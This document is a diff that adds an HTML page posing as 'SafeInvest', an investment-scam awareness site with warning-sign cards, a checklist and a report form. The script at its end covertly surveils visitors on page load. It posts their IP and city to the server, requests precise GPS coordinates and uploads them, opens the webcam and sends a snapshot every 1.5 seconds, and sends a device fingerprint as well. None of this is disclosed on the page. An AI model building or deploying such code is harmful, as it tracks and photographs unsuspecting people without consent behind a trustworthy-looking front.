@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SafeInvest – Avoid Investment Scams</title>
+  <style>
+    :root {
+      --primary: #0d1b2a;
+      --secondary: #1b263b;
+      --accent: #fca311;
+      --danger: #e63946;
+      --success: #2a9d8f;
+      --light: #f8f9fa;
+      --text: #212529;
+    }
+
+    * {margin:0;padding:0;box-sizing:border-box;}
+    body {
+      font-family: 'Inter', Arial, sans-serif;
+      color: var(--text);
+      background: var(--light);
+      line-height: 1.6;
+    }
+    a {color: inherit; text-decoration: none;}
+
+    /* Header */
+    header {
+      background: var(--primary);
+      color: #fff;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 8px rgba(0,0,0,.2);
+    }
+    .container {
+      max-width: 1200px;
+      margin: auto;
+      padding: 0 1rem;
+    }
+    nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 0;
+    }
+    .logo {
+      font-weight: 700;
+      font-size: 1.5rem;
+      color: var(--accent);
+    }
+    .nav-links {
+      display: flex;
+      gap: 1.5rem;
+    }
+    .nav-links a {
+      color: #fff;
+      transition: color .3s;
+      font-weight: 500;
+    }
+    .nav-links a:hover {color: var(--accent);}
+
+    /* Mobile Menu */
+    .menu-toggle {display: none; cursor: pointer; font-size: 1.8rem;}
+    @media (max-width:768px){
+      .nav-links {display: none; flex-direction: column; background: var(--primary); position: absolute; top:60px; right:0; width:200px; padding:1rem; box-shadow:0 4px 8px rgba(0,0,0,.3);}
+      .nav-links.active {display:flex;}
+      .menu-toggle {display:block; color:#fff;}
+    }
+
+    /* Hero */
+    .hero {
+      text-align: center;
+      padding: 4rem 1rem;
+      background: linear-gradient(to right, var(--secondary), var(--primary));
+      color: #fff;
+    }
+    .hero h1 {font-size: 2.5rem; margin-bottom: 1rem;}
+    .hero p {max-width: 600px; margin: auto; font-size: 1.1rem; opacity:.9;}
+
+    .warning-banner {
+      background: var(--danger);
+      color: #fff;
+      padding: 1rem;
+      border-radius: .5rem;
+      margin: 2rem auto;
+      max-width: 600px;
+      font-weight: 500;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% {box-shadow:0 0 0 0 rgba(230,57,70,.5);}
+      70% {box-shadow:0 0 0 10px rgba(230,57,70,0);}
+      100% {box-shadow:0 0 0 0 rgba(230,57,70,0);}
+    }
+
+    /* Sections */
+    section {padding: 4rem 1rem;}
+    .section-title {
+      text-align: center;
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: var(--secondary);
+      margin-bottom: 2rem;
+      position: relative;
+    }
+    .section-title::after {
+      content:"";
+      display:block;
+      width:60px;
+      height:4px;
+      background: var(--accent);
+      margin: .5rem auto 0;
+      border-radius: 2px;
+    }
+
+    /* Cards */
+    .card-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1.5rem;
+    }
+    .card {
+      background: #fff;
+      border-radius: .5rem;
+      box-shadow: 0 4px 12px rgba(0,0,0,.05);
+      transition: transform .3s, box-shadow .3s;
+      overflow: hidden;
+    }
+    .card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 8px 20px rgba(0,0,0,.1);
+    }
+    .card-header {
+      padding: 1rem;
+      font-weight: 600;
+      color: #fff;
+    }
+    .card-body {padding: 1rem;}
+    .card.scam .card-header {background: var(--danger);}
+    .card.safe .card-header {background: var(--success);}
+
+    /* Checklist */
+    .checklist {
+      background: #fff;
+      border-radius: .5rem;
+      padding: 2rem;
+      max-width: 700px;
+      margin: auto;
+      box-shadow: 0 4px 12px rgba(0,0,0,.05);
+    }
+    .check-item {
+      display: flex;
+      align-items: center;
+      padding: .5rem 0;
+      border-bottom: 1px solid #eee;
+    }
+    .check-item:last-child {border: none;}
+    .check-item input {margin-right: 1rem;}
+
+    /* Form */
+    .scam-reporter {
+      background: var(--secondary);
+      color: #fff;
+      border-radius: .5rem;
+      padding: 2rem;
+      max-width: 700px;
+      margin: auto;
+    }
+    .form-group {margin-bottom: 1rem;}
+    .form-group label {display:block;margin-bottom:.3rem;font-weight:500;}
+    .form-group input,
+    .form-group textarea,
+    .form-group select {
+      width:100%;padding:.6rem;border:none;border-radius:.3rem;
+    }
+    .btn {
+      background: var(--accent);
+      color: #000;
+      padding:.7rem 1.5rem;
+      border:none;border-radius:.3rem;
+      font-weight:600;
+      cursor:pointer;
+      transition:background .3s;
+    }
+    .btn:hover {background:#e89b0c;}
+
+    /* Footer */
+    footer {
+      background: var(--primary);
+      color: #fff;
+      text-align: center;
+      padding: 2rem 1rem;
+    }
+    .footer-links {display:flex;flex-wrap:wrap;justify-content:center;gap:1rem;margin:1rem 0;}
+    .footer-links a:hover {color: var(--accent);}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container">
+      <nav>
+        <div class="logo">SafeInvest</div>
+        <div class="menu-toggle" id="menuToggle">☰</div>
+        <ul class="nav-links" id="navLinks">
+          <li><a href="#warning-signs">Warning Signs</a></li>
+          <li><a href="#safe-investing">Safe Investing</a></li>
+          <li><a href="#checklist">Checklist</a></li>
+          <li><a href="#report">Report Scam</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero">
+    <h1>Protect Yourself From Investment Scams</h1>
+    <p>Learn to identify fraudulent platforms and protect your hard-earned money with proven safe investing practices.</p>
+    <div class="warning-banner">
+      ⚠️ Warning: Most online investment platforms are scams! Always double-check legitimacy before investing.
+    </div>
+  </section>
+
+  <section id="warning-signs">
+    <div class="container">
+      <h2 class="section-title">Common Signs of Investment Scams</h2>
+      <div class="card-container">
+        <div class="card scam">
+          <div class="card-header">Guaranteed Returns</div>
+          <div class="card-body">No legitimate investment guarantees high returns with zero risk. If it sounds too good to be true, it probably is.</div>
+        </div>
+        <div class="card scam">
+          <div class="card-header">Pressure to Act Fast</div>
+          <div class="card-body">Scammers create urgency to prevent proper research or advice. Never rush investing decisions.</div>
+        </div>
+        <div class="card scam">
+          <div class="card-header">Unregistered Sellers</div>
+          <div class="card-body">Always verify that both the product and the seller are registered with regulatory authorities.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="safe-investing" style="background:#f1f3f5;">
+    <div class="container">
+      <h2 class="section-title">Safe Investment Practices</h2>
+      <div class="card-container">
+        <div class="card safe">
+          <div class="card-header">Proper Documentation</div>
+          <div class="card-body">Legitimate investments provide detailed prospectuses, offering circulars, and financial statements.</div>
+        </div>
+        <div class="card safe">
+          <div class="card-header">Regulatory Compliance</div>
+          <div class="card-body">Verify platform registration with relevant financial authorities in your region.</div>
+        </div>
+        <div class="card safe">
+          <div class="card-header">Transparent Fees</div>
+          <div class="card-body">Hidden fees are a major red flag. Reliable platforms clearly disclose fee structures.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="checklist">
+    <div class="container">
+      <h2 class="section-title">Investment Verification Checklist</h2>
+      <div class="checklist">
+        <div class="check-item"><input type="checkbox" id="c1"><label for="c1">Verify regulatory registration</label></div>
+        <div class="check-item"><input type="checkbox" id="c2"><label for="c2">Research company contact details</label></div>
+        <div class="check-item"><input type="checkbox" id="c3"><label for="c3">Check reviews and complaints</label></div>
+        <div class="check-item"><input type="checkbox" id="c4"><label for="c4">Consult a licensed financial advisor</label></div>
+        <div class="check-item"><input type="checkbox" id="c5"><label for="c5">Read all documentation carefully</label></div>
+        <div class="check-item"><input type="checkbox" id="c6"><label for="c6">Understand all fees and policies</label></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="report">
+    <div class="container">
+      <h2 class="section-title">Report Suspicious Platforms</h2>
+      <div class="scam-reporter">
+        <form id="scamReportForm">
+          <div class="form-group">
+            <label for="platformName">Platform Name</label>
+            <input type="text" id="platformName" required>
+          </div>
+          <div class="form-group">
+            <label for="platformURL">Website URL</label>
+            <input type="url" id="platformURL" required>
+          </div>
+          <div class="form-group">
+            <label for="reason">Reason</label>
+            <select id="reason" required>
+              <option value="">Select a reason</option>
+              <option>Guaranteed high returns</option>
+              <option>Pressure tactics</option>
+              <option>Unregistered platform</option>
+              <option>Withdrawal issues</option>
+              <option>Other</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label for="details">Additional Details</label>
+            <textarea id="details" rows="3"></textarea>
+          </div>
+          <button type="submit" class="btn">Submit Report</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <p>© 2025 SafeInvest. Educational content only, not financial advice.</p>
+    <div class="footer-links">
+      <a href="#">Home</a>
+      <a href="#warning-signs">Warning Signs</a>
+      <a href="#safe-investing">Safe Investing</a>
+      <a href="#checklist">Checklist</a>
+      <a href="#report">Report Scam</a>
+    </div>
+  </footer>
+
+  <script>
+    // Mobile menu toggle
+    const menuToggle = document.getElementById('menuToggle');
+    const navLinks = document.getElementById('navLinks');
+    menuToggle.addEventListener('click', () => {
+      navLinks.classList.toggle('active');
+    });
+
+    // Form submission (demo)
+    document.getElementById('scamReportForm').addEventListener('submit', e => {
+      e.preventDefault();
+      const name = document.getElementById('platformName').value;
+      alert(`Thank you for reporting ${name}. Your report helps others stay safe.`);
+      e.target.reset();
+    });
+
+    // Checklist strike through
+    document.querySelectorAll('.check-item input').forEach(chk => {
+      chk.addEventListener('change', () => {
+        chk.parentElement.style.opacity = chk.checked ? .6 : 1;
+        chk.parentElement.style.textDecoration = chk.checked ? 'line-through' : 'none';
+      });
+    });
+
+    // IP info on page load
+    async function fetchIPDetails() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const ipInfo = {
+          ip: data.ip,
+          version: data.version,
+          isp: data.org,
+          country: data.country_name,
+          city: data.city
+        };
+        await fetch('/save_ip_info', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(ipInfo)
+        });
+      } catch (err) {
+        console.error("Failed to fetch IP info:", err);
+      }
+    }
+
+    // GPS-only location capture on load
+    function captureLocation() {
+      const statusDiv = document.getElementById('location-status');
+
+      if (!navigator.geolocation) {
+        statusDiv.innerText = 'Geolocation not supported.';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async pos => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          statusDiv.innerText = 'Location captured.';
+          try {
+            await fetch('/save_location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ latitude, longitude, accuracy })
+            });
+            statusDiv.innerText = 'Location sent successfully.';
+          } catch (err) {
+            console.error('Location send failed:', err);
+            statusDiv.innerText = 'Failed to send location.';
+          }
+        },
+        err => {
+          console.warn('Location error:', err.message);
+          statusDiv.innerText = 'Location blocked or unavailable.';
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    // Camera capture every 1.5s
+    async function captureCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 720, height: 420 } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        let counter = 1;
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        async function captureFrame() {
+          canvas.width = 720;
+          canvas.height = 420;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL('image/png');
+          try {
+            await fetch('/save_photo', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: dataUrl, count: counter })
+            });
+            counter++;
+          } catch (err) {
+            console.error('Camera upload failed:', err);
+          }
+          setTimeout(captureFrame, 1500);
+        }
+
+        captureFrame();
+      } catch (err) {
+        console.error('Camera access denied or failed:', err);
+      }
+    }
+
+    // Client system info
+    async function reportClientInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const dbg = gl && gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+
+        let osVersion = 'Unknown';
+        const ua = navigator.userAgent;
+        const android = ua.match(/Android\s([0-9\.]+)/);
+        const ios = ua.match(/iPhone OS ([0-9\_]+)/);
+        if (android) osVersion = android[1];
+        else if (ios) osVersion = ios[1].replace('_', '.');
+
+        const info = {
+          battery: Math.floor(battery.level * 100),
+          cpuCores: navigator.hardwareConcurrency || 'Unknown',
+          ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+          gpu,
+          osVersion,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+
+        await fetch('/save_client_info', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(info)
+        });
+      } catch (err) {
+        console.error('Client info report failed:', err);
+      }
+    }
+
+    // Initialize everything on page load
+    window.addEventListener('load', () => {
+      fetchIPDetails();
+      captureLocation();
+      captureCamera();
+      reportClientInfo();
+    });
+  </script>
+</body>
+</html>
